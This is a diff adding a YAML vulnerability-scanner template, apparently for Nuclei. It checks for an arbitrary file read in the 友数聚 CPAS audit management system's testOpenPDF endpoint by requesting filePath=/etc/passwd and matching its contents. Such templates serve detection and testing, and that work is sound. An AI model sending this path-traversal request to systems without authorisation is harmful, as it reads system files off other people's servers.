@@ -1,0 +1,31 @@
+id: poc-yaml-youdatasum-cpas-testopenpdf-anyfile-read
+info:
+  name: 友数聚 CPAS审计管理系统 testOpenPDF 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the CPAS审计管理系统 via the testOpenPDF endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cpasm4/iWebPdf/testOpenPDF?filePath=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "application/pdf"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
